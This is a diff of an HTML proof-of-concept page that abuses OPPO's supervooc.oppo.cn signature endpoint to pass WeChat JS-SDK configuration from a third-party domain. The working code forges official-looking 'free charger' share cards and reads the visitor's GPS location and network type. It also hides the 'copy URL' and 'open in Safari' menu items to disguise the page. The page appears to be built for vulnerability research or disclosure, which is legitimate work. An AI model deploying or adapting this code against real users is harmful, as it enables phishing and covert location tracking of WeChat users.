@@ -1,80 +1,138 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>JSSDK PoC</title>
   <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
+  <style>
+    body { font-family: monospace; padding: 16px; background: #0d1117; color: #c9d1d9; }
+    h3 { color: #58a6ff; }
+    .item { margin: 6px 0; padding: 8px 12px; border-radius: 6px; background: #161b22; border-left: 3px solid #30363d; }
+    .ok  { border-left-color: #3fb950; color: #3fb950; }
+    .err { border-left-color: #f85149; color: #f85149; }
+    .info{ border-left-color: #58a6ff; color: #58a6ff; }
+    .warn{ border-left-color: #d29922; color: #d29922; }
+    pre  { background:#161b22; padding:12px; border-radius:6px; overflow-x:auto; font-size:12px; color:#c9d1d9; }
+  </style>
 </head>
 <body>
-  <p id="result">初始化中...</p>
+  <h3>🔬 WeChat JS-SDK PoC — supervooc.oppo.cn</h3>
+  <div id="log"></div>
+
   <script>
+    const TARGET = 'https://supervooc.oppo.cn/pp/api/public/wxChatScan';
     const pageUrl = location.href.split('#')[0];
 
-    fetch('https://supervooc.oppo.cn/pp/api/public/wxChatScan', {
+    function log(msg, type='info') {
+      const d = document.createElement('div');
+      d.className = 'item ' + type;
+      d.innerHTML = msg;
+      document.getElementById('log').appendChild(d);
+    }
+
+    log('📡 目标接口: ' + TARGET, 'info');
+    log('🌐 当前页面: ' + pageUrl, 'info');
+    log('⏳ 正在请求签名...', 'warn');
+
+    fetch(TARGET, {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: 'url=' + encodeURIComponent(pageUrl) + '&type=3'
     })
     .then(r => r.json())
     .then(res => {
+      if (!res.data) { log('❌ 接口返回异常: ' + JSON.stringify(res), 'err'); return; }
       const d = res.data;
-      document.getElementById('result').innerText = '获取签名成功，配置中...';
+
+      log('✅ 签名获取成功', 'ok');
+      log('<pre>'
+        + 'appId    : ' + d.appId + '\n'
+        + 'timestamp: ' + d.timestamp + '\n'
+        + 'nonceStr : ' + d.nonceStr + '\n'
+        + 'signature: ' + d.signature
+        + '</pre>', 'info');
 
       wx.config({
-        debug: true,
-        appId: d.appId,
+        debug: false,
+        appId:     d.appId,
         timestamp: d.timestamp,
-        nonceStr: d.nonceStr,
+        nonceStr:  d.nonceStr,
         signature: d.signature,
-       jsApiList: [
-                 'getNetworkType',        // ✅ 已确认
-                 'closeWindow',           // 关闭网页
-                 'scanQRCode',            // 调起扫码
-                 'chooseImage',           // 调起相册/摄像头
-                 'getLocalImgData',       // 获取本地图片
-                 'openLocation',          // 打开地图（不需要域名校验）
-                 'wx.miniProgram.navigateTo'  // 跳转小程序
-            ]
+        jsApiList: [
+          'updateAppMessageShareData',
+          'onMenuShareTimeline',
+          'onMenuShareAppMessage',
+          'getNetworkType',
+          'getLocation',
+          'scanQRCode',
+          'chooseImage',
+          'openLocation',
+          'closeWindow',
+          'hideMenuItems',
+          'showMenuItems'
+        ]
       });
 
-      wx.ready(function() {
-        document.getElementById('result').innerText = '✅ wx.ready() 触发 — 漏洞确认';
+      wx.ready(function () {
+        log('✅ <b>wx.ready() 触发 — 签名在第三方域名验证通过</b>', 'ok');
 
-        // 1. 伪造分享卡片
-        wx.updateAppMessageShareData({
-          title: 'OPPO官方活动：领取免费充电器',
-          desc: '点击参与，限时免费',
-          link: 'https://tscanner9.github.io/poc/',
-          imgUrl: 'https://supervooc.oppo.cn/favicon.ico',
-          success: function() {
-            document.getElementById('result').innerText += '\n✅ 分享卡片伪造成功';
-          }
+        // ── 1. 网络类型（已知可用）──────────────────────────
+        wx.getNetworkType({
+          success: function(r) {
+            log('✅ getNetworkType: ' + r.networkType + ' (simtype:' + r.simtype + ')', 'ok');
+          },
+          fail: function(r) { log('❌ getNetworkType: ' + r.errMsg, 'err'); }
         });
 
-        // 2. 获取地理位置
+        // ── 2. 自定义分享（好友）────────────────────────────
+        wx.updateAppMessageShareData({
+          title:  'OPPO官方活动：领取免费SuperVOOC充电器',
+          desc:   '限时免费领取，点击参与活动',
+          link:   pageUrl,
+          imgUrl: 'https://supervooc.oppo.cn/favicon.ico',
+          success: function()  { log('✅ updateAppMessageShareData: 分享卡片设置成功', 'ok'); },
+          fail:    function(r) { log('❌ updateAppMessageShareData: ' + r.errMsg, 'err'); }
+        });
+
+        // ── 3. 自定义分享（朋友圈）──────────────────────────
+        wx.onMenuShareTimeline({
+          title:  'OPPO SuperVOOC 官方活动',
+          link:   pageUrl,
+          imgUrl: 'https://supervooc.oppo.cn/favicon.ico',
+          success: function()  { log('✅ onMenuShareTimeline: 朋友圈分享设置成功', 'ok'); },
+          fail:    function(r) { log('❌ onMenuShareTimeline: ' + r.errMsg, 'err'); }
+        });
+
+        // ── 4. 地理位置 ──────────────────────────────────────
         wx.getLocation({
           type: 'wgs84',
-          success: function(res) {
-            document.getElementById('result').innerText
-              += '\n✅ 获取位置成功: ' + res.latitude + ',' + res.longitude;
+          success: function(r) {
+            log('✅ getLocation: lat=' + r.latitude + ' lng=' + r.longitude, 'ok');
           },
-          fail: function(err) {
-            document.getElementById('result').innerText
-              += '\n❌ 位置获取失败: ' + err.errMsg;
-          }
+          fail: function(r) { log('❌ getLocation: ' + r.errMsg, 'err'); }
         });
 
-        // 3. 获取网络状态
-        wx.getNetworkType({
-          success: function(res) {
-            document.getElementById('result').innerText
-              += '\n✅ 网络类型: ' + res.networkType;
-          }
+        // ── 5. 扫码 ──────────────────────────────────────────
+        // 注意：scanQRCode 需用户手动触发，此处仅测试接口是否可调用
+        // wx.scanQRCode({ needResult: 1, scanType: ['qrCode'] });
+
+        // ── 6. 隐藏菜单项 ────────────────────────────────────
+        wx.hideMenuItems({
+          menuList: ['menuItem:copyUrl', 'menuItem:openWithSafari'],
+          success: function()  { log('✅ hideMenuItems: 菜单隐藏成功', 'ok'); },
+          fail:    function(r) { log('❌ hideMenuItems: ' + r.errMsg, 'err'); }
         });
+
       });
 
-      wx.error(function(err) {
-        document.getElementById('result').innerText = '❌ wx.error: ' + err.errMsg;
+      wx.error(function(r) {
+        log('❌ wx.error: ' + r.errMsg, 'err');
       });
+
+    })
+    .catch(e => {
+      log('❌ Fetch 失败: ' + e.message, 'err');
     });
   </script>
 </body>
